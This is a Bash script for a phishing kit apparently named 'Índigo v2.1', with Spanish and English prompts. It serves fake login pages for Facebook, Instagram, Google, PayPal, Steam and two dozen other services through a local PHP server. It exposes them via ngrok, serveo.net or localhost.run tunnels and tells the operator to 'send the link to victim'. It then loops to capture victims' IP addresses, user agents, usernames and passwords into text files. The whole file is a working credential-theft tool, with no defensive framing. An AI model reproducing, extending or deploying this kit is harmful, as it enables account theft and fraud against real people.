trap 'printf "\n";stop;exit 1' 2
deps() {
command -v php > /dev/null 2>&1 || { echo >&2 "PHP no esta instalado ! instalalo."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "Curl no esta instalado ! instalalo."; exit 1; }
command -v ssh > /dev/null 2>&1 || { echo >&2 "Openssh no esta instalado ! instalalo"; exit 1; }
command -v unzip > /dev/null 2>&1 || { echo >&2 "Unzip no esta instalado ! instalalo"; exit 1; }
}
banner() {
clear

printf "     \e[1;31m                               \n"   
printf "    ╔═╗╔═╗╔══╗╔════╗╔═══╗╔═══╗╔══╗╔═══╗\n"
printf "    ║║╚╝║║╚╣─╝║╔╗╔╗║║╔═╗║║╔═╗║╚╣─╝║╔═╗║\n"
printf "    ║╔╗╔╗║─║║─╚╝║║╚╝║║─║║║╚══╗─║║─║╚══╗\n"
printf "    ║║║║║║─║║───║║──║║─║║╚══╗║─║║─╚══╗║\n"
printf "    ║║║║║║╔╣─╗──║║──║╚═╝║║╚═╝║╔╣─╗║╚═╝║\n"
printf "    ╚╝╚╝╚╝╚══╝──╚╝──╚═══╝╚═══╝╚══╝╚═══╝v2.1\n" 
printf "     \e[1;31m\e[1;31       Índigo \e[1;31m \n"

}
menu() {
printf " \e[1;31m[\e[1;31m\e[1;31m01\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Facebook    \e[1;31m\e[1;31m[\e[1;31m\e[1;31m11\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Twitch      \e[1;31m\e[1;31m[\e[1;31m\e[1;31m21\e[1;31m\e[1;31m]\e[1;31m\e[1;31m DeviantArt\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m02\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Instagram   \e[1;31m\e[1;31m[\e[1;31m\e[1;31m12\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Pinterest   \e[1;31m\e[1;31m[\e[1;31m\e[1;31m22\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Badoo\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m03\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Google      \e[1;31m\e[1;31m[\e[1;31m\e[1;31m13\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Snapchat    \e[1;31m\e[1;31m[\e[1;31m\e[1;31m23\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Origin\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m04\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Microsoft   \e[1;31m\e[1;31m[\e[1;31m\e[1;31m14\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Linkedin    \e[1;31m\e[1;31m[\e[1;31m\e[1;31m24\e[1;31m\e[1;31m]\e[1;31m\e[1;31m CryptoCoin\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m05\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Netflix     \e[1;31m\e[1;31m[\e[1;31m\e[1;31m15\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Ebay        \e[1;31m\e[1;31m[\e[1;31m\e[1;31m25\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Yahoo\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m06\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Paypal      \e[1;31m\e[1;31m[\e[1;31m\e[1;31m16\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Dropbox     \e[1;31m\e[1;31m[\e[1;31m\e[1;31m26\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Wordpress\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m07\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Steam       \e[1;31m\e[1;31m[\e[1;31m\e[1;31m17\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Protonmail  \e[1;31m\e[1;31m[\e[1;31m\e[1;31m27\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Yandex\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m08\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Twitter     \e[1;31m\e[1;31m[\e[1;31m\e[1;31m18\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Spotify     \e[1;31m\e[1;31m[\e[1;31m\e[1;31m28\e[1;31m\e[1;31m]\e[1;31m\e[1;31m StackoverFlow\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m09\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Playstation \e[1;31m\e[1;31m[\e[1;31m\e[1;31m19\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Reddit      \e[1;31m\e[1;31m[\e[1;31m\e[1;31m29\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Vk\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m10\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Github      \e[1;31m\e[1;31m[\e[1;31m\e[1;31m20\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Adobe       \e[1;31m\e[1;31m[\e[1;31m\e[1;31mx\e[1;31m\e[1;31m] \e[1;31m\e[1;31mExit\e[1;31m\n"
printf "\e[1;31m\n"
read -p $' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Elegi una opcion \e[1;31m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
facebook
elif [[ $option == 2 || $option == 02 ]]; then
instagram
elif [[ $option == 3 || $option == 03 ]]; then
gmail
elif [[ $option == 4 || $option == 04 ]]; then
server="microsoft"
start
elif [[ $option == 5 || $option == 05 ]]; then
server="netflix"
start
elif [[ $option == 6 || $option == 06 ]]; then
server="paypal"
start
elif [[ $option == 7 || $option == 07 ]]; then
server="steam"
start
elif [[ $option == 8 || $option == 08 ]]; then
server="twitter"
start
elif [[ $option == 9 || $option == 09 ]]; then
server="playstation"
start
elif [[ $option == 10 ]]; then
server="github"
start
elif [[ $option == 11 ]]; then
server="twitch"
start
elif [[ $option == 12 ]]; then
server="pinterest"
start
elif [[ $option == 13 ]]; then
server="snapchat"
start
elif [[ $option == 14 ]]; then
server="linkedin"
start
elif [[ $option == 15 ]]; then
server="ebay"
start
elif [[ $option == 16 ]]; then
server="dropbox"
start
elif [[ $option == 17 ]]; then
server="protonmail"
start
elif [[ $option == 18 ]]; then
server="spotify"
start
elif [[ $option == 19 ]]; then
server="reddit"
start
elif [[ $option == 20 ]]; then
server="adobe"
start
elif [[ $option == 21 ]]; then
server="deviantart"
start
elif [[ $option == 22 ]]; then
server="badoo"
start
elif [[ $option == 23 ]]; then
server="origin"
start
elif [[ $option == 24 ]]; then
server="cryptocoinsniper"
start
elif [[ $option == 25 ]]; then
server="yahoo"
start
elif [[ $option == 26 ]]; then
server="wordpress"
start
elif [[ $option == 27 ]]; then
server="yandex"
start
elif [[ $option == 28 ]]; then
server="stackoverflow"
start
elif [[ $option == 29 ]]; then
vk
elif [[ $option == X || $option == x ]]; then
exit 1
else
printf " \e[1;31m[\e[1;31m\e[1;31m!\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Invalid option \e[1;91m[\e[1;31m\e[1;31m!\e[1;31m\e[1;31m]\e[1;31m\n"
sleep 1
banner
menu
fi
}
facebook(){
printf " \n"
printf " \e[1;31m[\e[1;31m\e[1;31m01\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Traditional Login Page\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m02\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Advanced Voting Poll Login Page\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m03\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Fake Security Login Page\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m04\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Facebook Messenger Login Page\e[1;31m\n"
printf "\e[1;31m\n"
read -p $' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Select an option: \e[1;31m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="facebook"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="fb_advanced"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="fb_security"
start
elif [[ $option == 4 || $option == 04 ]]; then
server="fb_messenger"
start
else
printf " \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\e[1;31m Invalid option \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\n"
sleep 1
banner
menu
fi
}
instagram(){
printf " \n"
printf " \e[1;31m[\e[1;31m\e[1;31m01\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Traditional Login Page\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m02\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Auto Followers Login Page\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m03\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Blue Badge Verify Login Page\e[1;31m\n"
printf "\e[1;31m\n"
read -p $' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Select an option: \e[1;31m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="instagram"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="ig_followers"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="ig_verify"
start
else
printf " \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\e[1;31m Invalid option \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\n"
sleep 1
banner
menu
fi
}
gmail(){
printf " \n"
printf " \e[1;31m[\e[1;31m\e[1;31m01\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Gmail Old Login Page\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m02\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Gmail New Login Page\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m03\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Advanced Voting Poll\e[1;31m\n"
printf "\e[1;31m\n"
read -p $' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Select an option: \e[1;31m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="google"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="google_new"
start
elif [[ $option == 3 || $option == 03 ]]; then
server="google_poll"
start
else
printf " \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\e[1;31m Invalid option \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\n"
sleep 1
banner
menu
fi
}
vk(){
printf " \n"
printf " \e[1;31m[\e[1;31m\e[1;31m01\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Traditional Login Page\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m02\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Advanced Voting Poll Login Page\e[1;31m\n"
printf "\e[1;31m\n"
read -p $' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Select an option: \e[1;31m\e[1;96m\en' option
if [[ $option == 1 || $option == 01 ]]; then
server="vk"
start
elif [[ $option == 2 || $option == 02 ]]; then
server="vk_poll"
start
else
printf " \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\e[1;31m Invalid option \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\n"
sleep 1
banner
menu
fi
}
stop() {
checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e linksender ]]; then
rm -rf linksender
fi
}
start() {
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf "\n"
printf " \e[1;31m[\e[1;31m\e[1;31m01\e[1;31m\e[1;31m]\e[1;31m\e[1;31m LocalHost\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m02\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Ngrok.io\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m03\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Serveo.net\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m04\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Localhost.run\e[1;31m\n"
d_o_server="2"
printf "\n"
read -p $' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m selecciona uno: \e[1;31m\e[1;96m\en' option_server
option_server="${option_server:-${d_o_server}}"
if [[ $option_server == 3 || $option_server == 03 ]]; then
start_s
elif [[ $option_server == 2 || $option_server == 02 ]]; then
start_n
elif [[ $option_server == 4 || $option_server == 04 ]]; then
start_local
elif [[ $option_server == 1 || $option_server == 01 ]]; then
start_l
else
printf " \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\e[1;31m Invalid option \e[1;91m[\e[1;31m\e[1;97m!\e[1;31m\e[1;91m]\e[1;31m\n"
sleep 1
banner
start
fi
}
start_s() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
def_port="5555"
printf "\e[1;31m\n"
printf ' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m selecciona un puerto (Default:\e[1;31m\e[1;96m %s \e[1;31m\e[1;31m): \e[1;31m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
start_serveo
}
start_serveo() {
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Initializing...\e[1;31m\e[1;31m(\e[1;31m\e[1;96mlocalhost:$port\e[1;31m\e[1;31m)\e[1;31m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Launching Serveo ..\e[1;31m\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
$(which sh) -c 'ssh -R 80:localhost:'$port' serveo.net 2> /dev/null > linksender ' &
printf "\n"
sleep 7
send_url=$(grep -o "https://[0-9a-z]*\.serveo.net" linksender)
printf "\n"
printf ' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Send the link to victim :\e[1;31m\e[1;31m %s \n' $send_url
printf ' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m No aparece ningun link? copia y pega esto en otra terminal: ssh -R 80:localhost:'$port' serveo.net \e[1;31m\e[1;31m %s \n' 

printf ' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Para poner un subdominio personalizado copia y cambia la palabra "indigo" por el subdominio que quieras: ssh -R indigo:80:localhost:'$port' serveo.net \e[1;31m\e[1;31m %s \n'
printf "\n"
found
}
start_n() {
if [[ -e websites/$server/ip.txt ]]; then
rm -rf websites/$server/ip.txt
fi
if [[ -e websites/$server/usernames.txt ]]; then
rm -rf websites/$server/usernames.txt
fi
if [[ -e ngrok ]]; then
echo ""
else
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Initializing...\e[1;31m\e[1;31m(\e[1;31m\e[1;96mlocalhost:5555\e[1;31m\e[1;31m)\e[1;31m\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf " \e[1;31m[\e[1;31m\e[1;31m!\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Error \e[1;31m[\e[1;31m\e[1;31m!\e[1;31m\e[1;31m]\e[1;31m\e[1;96m Please Install All Packges.\e[1;31m\n"
exit 1
fi
else
curl -LO https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf " \e[1;31m[\e[1;31m\e[1;31m!\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Error \e[1;31m[\e[1;31m\e[1;31m!\e[1;31m\e[1;31m]\e[1;31m\e[1;96m Please Install All Packges.\e[1;31m\n"
exit 1
fi
fi
fi
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Launching Ngrok ..\e[1;31m\n"
cd websites/$server && php -S 127.0.0.1:5555 > /dev/null 2>&1 &
sleep 2
./ngrok http 5555 > /dev/null 2>&1 &
sleep 10
link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;96m Send the link to victim :\e[1;31m\e[1;31m %s \n" $link
found
}
start_local(){
def_port="5555"
printf "\e[1;31m\n"
printf ' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m selecciona un puerto (Default:\e[1;31m\e[1;96m %s \e[1;31m\e[1;31m): \e[1;31m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Initializing...\e[1;31m\e[1;31m(\e[1;31m\e[1;96mlocalhost:$port\e[1;31m\e[1;31m)\e[1;31m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Launching LocalHostRun ..\e[1;31m\n"
printf "\n"
if [[ -e linksender ]]; then
rm -rf linksender
fi
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;96m Ctrl + C to view Login Info.Press it After the Victim Opened It.\e[1;31m\n"
printf "\e[1;31m\n"
ssh -R 80:localhost:$port ssh.localhost.run 2>&1
printf "\e[1;31m\n"
printf "\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Login Info..\e[1;31m\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
c_ip
rm -rf websites/$server/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
account=$(grep -o 'Username:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'Pass:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Account:\e[1;31m\e[1;96m %s\n\e[1;31m" $account
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Password:\e[1;31m\e[1;96m %s\n\e[1;31m" $password
cat websites/$server/usernames.txt >> websites/$server/login_info.txt
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;96m Saved:\e[1;31m\e[1;31m websites/%s/login_info.txt\e[1;31m\n" $server
printf "\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;96m Press Ctrl + C para salir.\e[1;31m\n"
rm -rf websites/$server/usernames.txt
fi
sleep 0.75
done
}
start_l() {
def_port="5555"
printf "\e[1;31m\n"
printf ' \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m selecciona un puerto (Default:\e[1;31m\e[1;96m %s \e[1;31m\e[1;31m): \e[1;31m\e[1;96m' $def_port
read port
port="${port:-${def_port}}"
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m iniciando...\e[1;31m\e[1;31m(\e[1;31m\e[1;96mlocalhost:$port\e[1;31m\e[1;31m)\e[1;31m\n"
cd websites/$server && php -S 127.0.0.1:$port > /dev/null 2>&1 &
sleep 2
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Hosteado de forma exitsa :\e[1;31m\e[1;31m http://localhost:$port\e[1;31m\n"
printf "\n"
found
}
found() {
printf "\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m esperando por mas datos,\e[1;31m\e[1;96m Ctrl + C para salir.\e[1;31m\n"
printf "\n"
while [ true ]; do
if [[ -e "websites/$server/ip.txt" ]]; then
printf "\n"
printf " \e[1;31m[\e[1;31m\e[1;31m*\e[1;31m\e[1;31m]\e[1;31m\e[1;31m ip de la victima encontrada!\n"
printf "\n"
c_ip
rm -rf websites/$server/ip.txt
fi
sleep 0.75
if [[ -e "websites/$server/usernames.txt" ]]; then
printf " \e[1;31m[\e[1;31m\e[1;31m*\e[1;31m\e[1;31m]\e[1;31m\e[1;31m datos de inicio de sesion encontrados!!\n"
printf "\n"
c_cred
rm -rf websites/$server/usernames.txt
fi
sleep 0.75
done
}
c_ip() {
touch websites/$server/login_info.txt
ip=$(grep -a 'IP:' websites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' websites/$server/ip.txt | cut -d '"' -f2)
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Ip de la victima:\e[1;31m\e[1;96m %s\e[1;31m\n" $ip
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;96m Guardado:\e[1;31m\e[1;31m websites/%s/victim_ip.txt\e[1;31m\n" $server
printf "\n"
cat websites/$server/ip.txt >> websites/$server/victim_ip.txt
}
c_cred() {
account=$(grep -o 'Usuario:.*' websites/$server/usernames.txt | cut -d " " -f2)
IFS=$'\n'
password=$(grep -o 'contraseña:.*' websites/$server/usernames.txt | cut -d ":" -f2)
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Account:\e[1;31m\e[1;96m %s\n\e[1;31m" $account
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m Password:\e[1;31m\e[1;96m %s\n\e[1;31m" $password
cat websites/$server/usernames.txt >> websites/$server/login_info.txt
printf "\e[1;31m\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;96m Saved:\e[1;31m\e[1;31m websites/%s/login_info.txt\e[1;31m\n" $server
printf "\n"
printf " \e[1;31m[\e[1;31m\e[1;31m~\e[1;31m\e[1;31m]\e[1;31m\e[1;31m esperando por mas datos,\e[1;31m\e[1;96m Ctrl + C para salir.\e[1;31m\n"
}
banner
deps
menu
